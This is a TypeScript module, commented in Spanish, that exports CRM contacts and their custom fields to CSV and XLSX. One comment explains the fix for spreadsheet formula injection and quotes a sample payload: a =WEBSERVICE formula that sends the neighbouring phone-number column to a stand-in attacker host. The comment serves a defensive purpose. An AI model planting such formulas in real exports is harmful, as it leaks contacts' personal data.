import type { PoolClient } from 'pg';
import { celdaCsv, crearXlsx, type ValorCelda } from '@iaxti/core';
import { degradarSinRomper } from '@iaxti/db';
import { listCustomFields } from './campos';

/**
 * Exportación de contactos a CSV (issue 248; el permiso `crm.contacts.export`
 * estaba anotado como «no construida» en el catálogo).
 *
 * La contraparte de la importación (#34): quien importó su lista tiene que
 * poder llevársela. Y va en CSV y no en JSON porque quien la pide la va a
 * abrir en una planilla.
 *
 * Los campos personalizados DECLARADOS salen como columnas propias (#248):
 * exportar `custom` como un bloque de JSON en una celda sería devolverle al
 * negocio algo que no puede usar.
 */
const COLUMNAS_BASE = [
  'nombre',
  'telefono',
  'email',
  'rut',
  'origen',
  'etiquetas',
  'opt_in',
  'opt_out',
  'creado',
  'ultima_actividad',
] as const;

/**
 * La celda sale de `@iaxti/core` y no de acá (#1170).
 *
 * Lo que evita: esta función doblaba las comillas y encerraba el valor, y
 * encerrar entre comillas no detiene una fórmula —Excel las saca al importar
 * y evalúa el `=` igual—. Desde #1170 el campo `nombre` de un contacto lo
 * puede escribir un desconocido con el solo acto de mandar un WhatsApp (su
 * nombre de perfil), y esta ruta sirve `text/csv` con BOM y
 * `Content-Disposition: attachment`, o sea pensada para abrirse en una
 * planilla. Un nombre de perfil `=WEBSERVICE("https://evil.tld/?x="&B2)` se
 * evaluaba al abrir el archivo y se llevaba los teléfonos de la columna
 * vecina. La regla ya existía en el paquete de exportación del titular; lo
 * que faltaba era que fuera UNA.
 */
const celda = celdaCsv;

/**
 * Un campo propio puede guardar cualquier cosa; la planilla solo entiende
 * cuatro. Lo que no calza va como texto, que es lo que el CSV hacía con todo.
 */
function valorDeCampo(valor: unknown): ValorCelda {
  if (valor === null || valor === undefined) return null;
  if (typeof valor === 'number' || typeof valor === 'boolean') return valor;
  if (valor instanceof Date) return valor;
  return typeof valor === 'object' ? JSON.stringify(valor) : String(valor);
}

/** Anchos que evitan que lo más largo salga cortado al abrirlo. */
function anchoDe(titulo: string): number {
  if (titulo === 'email') return 30;
  if (titulo === 'nombre' || titulo === 'etiquetas') return 28;
  if (titulo === 'telefono' || titulo === 'creado' || titulo === 'ultima_actividad') return 18;
  return 16;
}

export interface ExportacionContactos {
  csv: string;
  filas: number;
  columnas: string[];
  /**
   * La misma exportación en una planilla de verdad (#709).
   *
   * El CSV se queda: quien lo necesita para importar a otro sistema lo sigue
   * teniendo. Lo que el CSV no puede dar es lo que rompe al abrirlo en Excel
   * con configuración de Chile — separador de coma, y sin tipos, así que
   * `+56981234567` llega como 5,6981E+10 y el RUT con guion como una resta.
   */
  xlsx: Buffer;
}

export async function exportarContactos(
  client: PoolClient,
  input: { tenantId: string; tope?: number },
): Promise<ExportacionContactos> {
  const tope = Math.min(Math.max(1, input.tope ?? 20_000), 50_000);
  // La consulta grande del export viene justo abajo y usa este mismo cliente:
  // si la lectura de los campos deja la transacción abortada, el export falla
  // con «current transaction is aborted» y nadie sabe qué pasó (#962, #966).
  const campos = await degradarSinRomper(
    client,
    (c) => listCustomFields(c, input.tenantId, 'contact'),
    (error) => {
      console.warn(
        `crm.exportar: no se pudieron leer los campos personalizados de ${input.tenantId}; ` +
          `el archivo sale sin sus columnas. Causa: ${error.message}`,
      );
      return [];
    },
  );

  const r = await client.query(
    `SELECT c.name, c.phone, c.email, c.rut, c.origin, c.opt_in_at, c.opted_out_at,
            c.created_at, c.last_activity_at, c.custom,
            COALESCE(
              (SELECT string_agg(t.name, ' | ' ORDER BY t.name)
                 FROM contact_tags ct JOIN tags t ON t.id = ct.tag_id
                WHERE ct.tenant_id = c.tenant_id AND ct.contact_id = c.id),
              ''
            ) AS etiquetas
       FROM contacts c
      WHERE c.tenant_id = $1 AND c.merged_into IS NULL
      ORDER BY c.created_at
      LIMIT $2`,
    [input.tenantId, tope],
  );

  const columnas = [...COLUMNAS_BASE, ...campos.map((f) => f.label)];
  const lineas = [columnas.map((c) => celda(c)).join(',')];
  // La planilla se arma de las MISMAS filas, en el mismo recorrido: dos
  // consultas darían dos verdades el día que una cambie.
  const filasXlsx: ValorCelda[][] = [];
  for (const fila of r.rows) {
    const custom = (fila.custom as Record<string, unknown>) ?? {};
    lineas.push(
      [
        celda(fila.name),
        celda(fila.phone),
        celda(fila.email),
        celda(fila.rut),
        celda(fila.origin),
        celda(fila.etiquetas),
        celda(fila.opt_in_at),
        celda(fila.opted_out_at),
        celda(fila.created_at),
        celda(fila.last_activity_at),
        ...campos.map((f) => celda(custom[f.key])),
      ].join(','),
    );
    filasXlsx.push([
      fila.name ?? null,
      // El teléfono y el RUT van como TEXTO a propósito: son identificadores,
      // no cantidades. Es justo lo que el CSV no puede decir.
      fila.phone ?? null,
      fila.email ?? null,
      fila.rut ?? null,
      fila.origin ?? null,
      fila.etiquetas || null,
      fila.opt_in_at ?? null,
      fila.opted_out_at ?? null,
      fila.created_at ?? null,
      fila.last_activity_at ?? null,
      ...campos.map((f) => valorDeCampo(custom[f.key])),
    ]);
  }

  return {
    csv: lineas.join('\n'),
    filas: r.rows.length,
    columnas,
    xlsx: crearXlsx({
      nombre: 'Contactos',
      columnas: columnas.map((titulo) => ({ titulo, ancho: anchoDe(titulo) })),
      filas: filasXlsx,
    }),
  };
}
